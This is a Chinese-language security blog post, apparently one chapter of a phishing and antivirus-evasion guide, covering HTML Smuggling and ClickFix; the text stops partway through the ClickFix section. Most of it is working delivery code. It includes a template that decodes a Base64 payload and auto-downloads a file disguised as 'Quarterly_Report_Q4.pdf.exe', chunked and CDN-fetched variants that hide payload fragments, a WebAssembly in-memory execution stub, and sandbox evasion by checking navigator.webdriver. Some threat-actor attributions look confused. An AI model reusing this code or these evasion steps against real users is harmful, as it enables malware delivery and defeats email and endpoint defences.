---
title: 邮件钓鱼免杀完全指南（2026 实战版）五、ClickFix 与 HTML Smuggling
url: https://mp.weixin.qq.com/s/Ki_F3Dxy1iPSVHBRxoekJg
source: Doonsec's feed
date: 2026-05-19
fetch_date: 2026-05-20T05:59:38.841831
---

# 邮件钓鱼免杀完全指南（2026 实战版）五、ClickFix 与 HTML Smuggling

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/P8tspoQj3Vpj9cIuLTovQaq6o3nflR7Yw43Vt1A76zQk3oYiaUg0nyJ8vTrR7JcKPpph8yvgIgh02NByw5zr7SSj7aOjSicfVL2nfHgBUcFk0/0?wx_fmt=jpeg)

# 邮件钓鱼免杀完全指南（2026 实战版）五、ClickFix 与 HTML Smuggling

原创

IceByte
IceByte

IceByte-Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/P8tspoQj3VqRK3Ticy6NpEPDnhKZ6KLXOCSNxe3KMMmuIqmT3dAacf5XMM0dxicuRLJysV25tTBIYrmKGvfQ3IHQWGagicwxCjefQjfCYbbibrE/640?wx_fmt=png&from=appmsg)

> **声明**：本文仅供网络安全研究与授权渗透测试参考，严禁用于任何非法活动。所有技术分析均基于公开安全研究与厂商报告。

在上一篇中我们深入拆解了 VHD/ISO/LNK 等传统免杀附件的武器化手法。然而 2025 年以来，攻击者的战场正从"附件投递"快速转向"浏览器端还原"——两种技术在这个新战场上占据了绝对主导地位：**ClickFix** 与 **HTML Smuggling**。

Microsoft 官方安全博客于 2025 年 8 月 21 日首次正式分析了 ClickFix 社会工程学技术，将其定义为"诱骗用户自行将恶意命令复制粘贴到终端执行"的攻击手法。KnowBe4 同期数据显示，HTML Smuggling 技术在 2024 年 11 月至 2025 年 2 月间增长了 85.6%。

这两种技术的本质相同：**将攻击的执行环节从"用户被动触发"转变为"用户主动参与"，彻底绕过沙箱、AMSI、EDR 等所有基于行为分析的检测手段。**

---

## 一、HTML Smuggling：客户端还原攻击

### 1.1 技术原理

HTML Smuggling（HTML 走私）的核心思想极其简洁：**将恶意 payload 经过编码后嵌入 HTML 文件内部，邮件安全网关只看到一个普通的 HTML 附件，而真正的恶意代码在用户浏览器中才被还原和执行。**

整个过程分为四个阶段：

```
```
Step 1: 编码嵌入 → 恶意 payload 经 Base64 编码后嵌入 HTML 文件
```

```
Step 2: 安全传输 → HTML 附件正常通过邮件安全网关检查
```

```
Step 3: 客户端还原 → 用户打开 HTML 后，JavaScript 调用 atob() 解码还原
```

```
Step 4: 下载执行 → Blob API 创建对象 URL，触发下载或内存执行
```
```

![](https://mmbiz.qpic.cn/mmbiz_png/P8tspoQj3VoibSsunOAKziaJqs4yxVBRxJv9GEDSGOKevsibSic7g9ic6qmXX6w6cgPpMaGPDzkdszFaPCP5J8QmOibL3RZdYibQotwYya7qf8g5RI/640?wx_fmt=png&from=appmsg)

### 1.2 基础实现代码

以下是一个 HTML Smuggling 的基础实现框架（仅展示技术原理，不包含完整 weaponized payload）：

```
<!DOCTYPE html>

```
<html>
```

```
<head><title>Document Viewer</title></head>
```

```
<body>
```

```
<h3>Document is loading, please wait...</h3>
```

```
<script>
```

```
// 1. Base64 编码的 payload（此处为示例占位符）
```

```
varencodedPayload="BASE64_ENCODED_MALWARE_HERE";
```

```

```

```
// 2. atob() 解码还原为二进制字符串
```

```
varbinaryString=atob(encodedPayload);
```

```

```

```
// 3. 转换为 Uint8Array
```

```
varbytes=newUint8Array(binaryString.length);
```

```
for (vari=0; i<binaryString.length; i++) {
```

```
    bytes[i] =binaryString.charCodeAt(i);
```

```
}
```

```

```

```
// 4. 创建 Blob 对象
```

```
varblob=newBlob([bytes], { type: "application/octet-stream" });
```

```

```

```
// 5. 创建临时下载链接
```

```
varurl=URL.createObjectURL(blob);
```

```
vara=document.createElement("a");
```

```
a.href=url;
```

```
a.download="Quarterly_Report_Q4.pdf.exe";  // 伪装文件名
```

```
document.body.appendChild(a);
```

```
a.click();
```

```

```

```
// 6. 清理内存中的对象 URL
```

```
setTimeout(function() {
```

```
    URL.revokeObjectURL(url);
```

```
    document.body.removeChild(a);
```

```
}, 100);
```

```
</script>
```

```
</body>
```

```
</html>
```
```

**关键 API 调用链**：

| API | 用途 | 检测难度 |
| --- | --- | --- |
| `atob()` | Base64 解码 | 低 — 合法 API，广泛使用 |
| `TextDecoder` | 二进制转文本 | 低 — 浏览器标准 API |
| `Blob()` | 创建内存中的二进制对象 | 低 — 合法 API |
| `URL.createObjectURL()` | 生成 blob:// 临时 URL | 中 — 可通过 DLP 监控 |
| `createElement('a')` | 创建下载链接 | 中 — 自动下载行为 |

### 1.3 进阶技术：分段走私（Chunked Smuggling）

基础的 HTML Smugging 将完整 payload 以一个 Base64 字符串嵌入，容易被先进的 SEG 通过内容长度分析和 Base64 熵值检测识别。分段走私技术将 payload 拆分为多个片段，分散存储在 HTML 的不同位置：

**同步分块变种**：

```
// 将 payload 拆分为 4 个片段，隐藏在 HTML 的不同属性中

```
varchunk1=document.getElementById("s1").getAttribute("data-c");
```

```
varchunk2=document.querySelector(".s2").dataset.c;
```

```
varchunk3=document.getElementById("header").getAttribute("data-v");
```

```
varchunk4=document.body.getAttribute("onload").split("'")[1];
```

```

```

```
// 拼接还原
```

```
varfull=chunk1+chunk2+chunk3+chunk4;
```

```
varbinary=atob(full);
```
```

对应的 HTML 结构：

```
<divid="s1"data-c="aW1wb3J0">   <!-- chunk 1 -->

```
<spanclass="s2"data-c="IHN5c3RlbQ==">  <!-- chunk 2 -->
```

```
<divid="header"data-v="OyBlY2hv">  <!-- chunk 3 -->
```

```
<bodyonload="init('J3Bvd2Vyc2hlbGwn')">
```
```

**异步分块变种（更难检测）**：

```
// 通过 fetch 从多个合法 CDN 分段获取 payload

```
asyncfunctionreassemble() {
```

```
    consturls= [
```

```
        'https://cdn.example.com/css/theme.css',  // 实际是 Base64 片段
```

```
        'https://cdn.example.com/js/util.js',      // 实际是 Base64 片段
```

```
        'https://cdn.example.com/img/logo.svg',     // 实际是 Base64 片段
```

```
    ];
```

```

```

```
    letchunks= [];
```

```
    for (leturlofurls) {
```

```
        letresp=awaitfetch(url);
```

```
        lettext=awaitresp.text();
```

```
        // 提取隐藏在文件注释中的 payload 片段
```

```
        letmatch=text.match(/\/\* ([A-Za-z0-9+/=]+) \*\//);
```

```
        if (match) chunks.push(match[1]);
```

```
    }
```

```

```

```
    letfull=chunks.join('');
```

```
    letbinary=atob(full);
```

```
    letbytes=newUint8Array(binary.length);
```

```
    for (leti=0; i<binary.length; i++) {
```

```
        bytes[i] =binary.charCodeAt(i);
```

```
    }
```

```

```

```
    letblob=newBlob([bytes], { type: "application/x-msdownload" });
```

```
    leturl=URL.createObjectURL(blob);
```

```
    leta=document.createElement('a');
```

```
    a.href=url;
```

```
    a.download='update.exe';
```

```
    a.click();
```

```
    URL.revokeObjectURL(url);
```

```
}
```
```

### 1.4 内存执行变种（完全落地免杀）

更高级的变种完全跳过文件落地步骤，直接在浏览器内存中还原 payload 并通过特定技术实现内存执行：

```
// 使用 WebAssembly 在浏览器沙箱中执行 payload

```
asyncfunctionmemExec(base64Payload) {
```

```
    // 1. 解码
```

```
    varbinaryString=atob(base64Payload);
```

```
    varbytes=newUint8Array(binaryString.length);
```

```
    for (vari=0; i<binaryString.length; i++) {
```

```
        bytes[i] =binaryString.charCodeAt(i);
```

```
    }
```

```

```

```
    // 2. 编译为 WebAssembly 模块
```

```
    varmodule=awaitWebAssembly.compile(bytes);
```

```

```

```
    // 3. 实例化执行（受限环境，但可用于信息收集/信标）
```

```
    varinstance=awaitWebAssembly.instantiate(module);
```

```
    instance.exports.main();
```

```
}
```
```

> **注意**：WebAssembly 沙箱对系统级操作有严格限制，主要用于信息收集信标而非完整的恶意执行。真正的内存执行需要配合浏览器漏洞（如 Chrome V8 exploit）才能实现提权。

### 1.5 绕过原理深度分析

HTML Smuggling 为何能绕过几乎所有传统邮件安全检测？从四个检测维度逐一分析：

**邮件网关视角**：

* 看到的是合法的 HTML 文件，MIME 类型为 `text/html`
* 文件内容是标准的 HTML + JavaScript，无恶意文件特征
* Base64 字符串可能是任何内容（CSS 内嵌图片、字体编码等都是合法场景）

**文件特征检测视角**：

* 无恶意文件扩展名（.exe / .dll / .ps1）
* 无已知恶意软件签名
* HTML 文件自身的哈希值每次都不同（payload 变化即哈希变化）

**内容扫描视角**：

* payload 处于编码状态，静态分析无法识别其真实内容
* 分段走私进一步降低了单个片段的熵值，避免触发 Base64 熵值检测
* JavaScript 代码使用的是浏览器标准 API，无法直接判定为恶意

**沙箱执行视角**：

* HTML 需要用户主动在浏览器中打开，邮件网关沙箱通常不渲染完整 HTML
* 即使渲染，缺少用户交互（如点击"下载"按钮）的页面不会触发 payload 还原
* 可通过检测 `navigator.webdriver` 属性来识别并规避自动化沙箱

```
// 沙箱规避：检测自动化环境

```
if (navigator.webdriver) {
```

```
    // 在沙箱中显示正常内容
```

```
    document.body.innerHTML="<h1>Quarterly Report 2025</h1>";
```

```
} else {
```

```
    // 在真实浏览器中执行走私逻辑
```

```
    reassemble();
```

```
}
```
```

### 1.6 实战案例：APT 组织的 HTML Smuggling 应用

**APT41（双尾蝎）**：

* 使用 HTML Smuggling 投递 Cobalt Strike Beacon
* HTML 文件伪装为"COVID-19 疫苗接种通知"
* payload 经过自定义加密 + Base64 双重编码

**Lazarus Group**：

* 2025 年针对金融行业的攻击中，使用 HTML Smuggling 投递远程管理工具
* payload 分为 3 段嵌入 HTML 的 data 属性中
* 还原后通过 certutil 进一步解码执行

**DarkGate Malware**：

* 2025 年大规模钓鱼活动中使用 HTML Smuggling 作为初始投递手段
* 自动化生成工具支持批量定制 HTML 伪装模板
* 与 ClickFix 技术结合使用，形成双重社工诱骗

> **ATT&CK 映射**：T1027.006（HTML Smuggling）→ T1204.002（恶意文件执行）→ T1059.001（PowerShell）→ T1071.001（Web C2）

---

## 二、ClickFix：让用户亲手执行恶意代码

### 2.1 什么是 ClickFix

ClickFix 是一种社会工程学攻击技术，其核心创新在于：**不再让用户点击链接或打开附件，而是诱骗用户自行将恶意命令复制粘贴到系统终端（如 PowerShell）中执行。**

Microsoft 官方安全博客 2025 年 8 月 21 日的分析文章将其定义为：

> "A social engineering technique that deceives users into copying and pasting malicious commands into their terminal, effectively weaponizing the user's own trust in troubleshooting instructions."

**为什么 ClickFix 是 2025 年最重大的钓鱼威胁之一？** 因为它从根本上颠覆了传统的防御假设：

| 传统钓鱼 | ClickFix |
| --- | --- |
| 用户点击链接 → 跳转到恶意页面 | 用户打开页面 → 复制命令 → 粘贴到终端 |
| 防御方可以拦截恶意链接/附件 | 命令来自用户自己的剪贴板 |
| 沙箱可以模拟点击行为 | 用户"主动"在终端执行，绕过行为检测 |
| AMSI/EDR 监控外部程序的执行 | 用户通过合法的 PowerShell 终端执行 |
| DLP 可以检测文件下载 | 命令从可信源（PowerShell Gallery/GitHub）下载 |

![](ht...